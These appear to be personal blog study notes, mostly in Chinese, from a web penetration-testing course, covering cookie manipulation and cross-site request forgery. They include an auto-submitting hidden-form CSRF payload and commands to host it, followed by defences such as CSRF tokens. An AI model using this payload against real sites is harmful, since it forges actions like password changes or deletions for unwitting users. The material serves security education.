---
title: Insecure Session Management
date: 2017-11-27 12:00:00
tags:
categories: Software
thumbnail: https://images.unsplash.com/photo-1556017069-cb3fe229ab46?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=1080&fit=max&ixid=eyJhcHBfaWQiOjF9
---
 
 <!-- more -->
# Learn Website Hacking / Penetration Testing From Scratch (15)

> [Ch15] Insecure Session Management
> Udemy 線上課程學習筆記

https://www.udemy.com/learn-website-hacking-penetration-testing-from-scratch/learn/v4/

## Logging In As Admin Without a Password By Manipulating Cookies

* `FireFox` CookieManager+
* `Chrome` EditThisCookie

## Discovering Cross Site Request Forgery Vulnerabilities (CSRF)

> * Request are not validated at the server side.
> * Server does not check if the user generated the request.
> * Requests can be forged and sent to users to make them do things they don't intend to do such as changing their password

建立一個Local端的假表單，action指向原網站，即可利用使用者目前仍有效的Session或Cookie進行變更密碼的動作

## Exploiting CSRF Vulnerabilities To Change Admin Password Using a HTML File

承上一章節，預設好要變更的value，加上javascript，使用者開啟檔案就會自動送出表單。

```javascript=
document.getElementById('form1').submit();
```

## Exploiting CSRF Vulnerabilities To Change Admin Password Using Link

承上一章節，將製作好的html檔案放上網路空間。將連結送給使用者，只用者只要點擊url就會自動送出表單。

put the csrf.html file to `Kali Linux` hosted by apache.

```shell=
cp Desktop/csrf.html /var/www/html
service apache2 start
```

browse the `xxx.xxx.xxx/csrf.html`

## [Security] The Right Way To Prevent CSRF Vulnerabilities

1. 再次驗證舊密碼
2. CSRF Token

## 以下補充

### 用自己的一句話解釋CSRF

> 在使用者非自願的情況下，用使用者的身份(合法)送出偽造(非法)的請求。

### 所謂的Cross Site

#### Cookie

### CSRF攻擊方式

1. 建立假的form，指定action post到目標網址

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='https://small-min.blog.com/delete' target="csrf-frame" id="csrf-form">
  <input type='hidden' name='id' value='3'>
  <input type='submit' value='submit'>
</form>
<script>document.getElementById("csrf-form").submit()</script>
```

### 如何避免

#### ASP.NET

![](https://i.imgur.com/arv3DyV.png)

![](https://i.imgur.com/6O5jDEp.png)

#### .NET CORE

https://docs.microsoft.com/zh-tw/aspnet/core/security/anti-request-forgery

CSRF token [anti forgrey token]

## 參考

[OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
[讓我們來談談 CSRF](http://blog.techbridge.cc/2017/02/25/csrf-introduction/)
[跨站請求偽造](https://zh.wikipedia.org/zh-tw/%E8%B7%A8%E7%AB%99%E8%AB%8B%E6%B1%82%E5%81%BD%E9%80%A0)